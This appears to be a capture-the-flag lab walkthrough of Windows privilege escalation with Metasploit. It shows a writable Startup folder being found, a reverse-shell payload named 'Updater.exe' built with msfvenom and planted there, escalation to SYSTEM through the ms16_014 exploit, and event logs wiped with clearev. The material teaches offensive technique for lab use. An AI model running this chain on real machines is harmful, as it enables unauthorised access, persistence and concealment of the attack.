# Metasploit

## 01 - Detect

```
meterpreter > getuid
Server username: TCM-PC\user
meterpreter > ls C:\\ProgramData\\Microsoft\\Windows\\Start\ Menu\\Programs\\Startup\\
Listing: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
======================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  178   fil   2015-03-27 08:34:08 -0400  Ec2WallpaperInfo.url
100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini

meterpreter > execute -Hicf icacls -a "\"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\""
Process 1888 created.
Channel 6 created.
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

## 02 - Exploit

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.145.108 lport=53 -f exe -o Updater.exe

meterpreter > upload Updater.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
[*] uploading  : /home/user/Documents/thm/winprivesc/Updater.exe -> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
[*] uploaded   : /home/user/Documents/thm/winprivesc/Updater.exe -> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/script/web_delivery) > handler -p windows/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53 -x
[*] Payload handler running as background job 2.

[*] Started reverse TCP handler on 10.8.145.108:53
```

Now we wait for the administrator user to login and wait for a callback connection.

```
$ xfreerdp /u:"<username>" /p:"<password>" /sec:<rdp | tls | nla> /v:<IP>

$ rdesktop -u <username> -p <password> <IP>

msf6 exploit(multi/script/web_delivery) >
[*] Sending stage (200774 bytes) to 10.10.22.1
[*] Meterpreter session 3 opened (10.8.145.108:53 -> 10.10.22.1:49237) at 2022-05-28 09:24:52 -0400

msf6 exploit(multi/script/web_delivery) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > getuid
Server username: TCM-PC\TCM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

## 03 - Cleanup

```
meterpreter > execute -f notepad
Process 4008 created.
meterpreter > migrate -N notepad.exe
[*] Migrating from 3352 to 4008...
[*] Migration completed successfully.
meterpreter > rm "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"
meterpreter > clearev
[*] Wiping 6 records from Application...
[-] stdapi_sys_eventlog_clear: Operation failed: Access is denied.
```

Looks like we can't clear the event logs. We'll have to escalate as `NT AUTHORITY\SYSTEM`. Let's enumerate some exploits.

```
meterpreter > run post/multi/recon/local_exploit_suggester showdescription=true

[*] 10.10.22.1 - Collecting local exploits for x64/windows...
..[snip]..
[+] 10.10.22.1 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
  This module exploits an uninitialized stack variable in the WMI 
  subsystem of ntoskrnl. This module has been tested on vulnerable 
  builds of Windows 7 SP0 x64 and Windows 7 SP1 x64.
..[snip]..
meterpreter > bg
[*] Backgrounding session 3...
msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/ms16_014_wmi_recv_notif
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > options

Module options (exploit/windows/local/ms16_014_wmi_recv_notif):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 SP0/SP1


msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > set lhost 10.8.145.108
lhost => 10.8.145.108
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > set lport 53
lport => 53
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > set session 3
session => 3
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > exploit

[*] Started reverse TCP handler on 10.8.145.108:53 
[*] Reflectively injecting the exploit DLL and running it...
[*] Launching msiexec to host the DLL...
[+] Process 2184 launched.
[*] Reflectively injecting the DLL into 2184...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200774 bytes) to 10.10.22.1
[*] Meterpreter session 4 opened (10.8.145.108:53 -> 10.10.22.1:49250) at 2022-05-28 09:34:33 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > clearev
[*] Wiping 6 records from Application...
[*] Wiping 15 records from System...
[*] Wiping 22 records from Security...
meterpreter > bg
[*] Backgrounding session 4...
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > sessions -k 3
[*] Killing the following session(s): 3
[*] Killing session 3
[*] 10.10.22.1 - Meterpreter session 3 closed.
```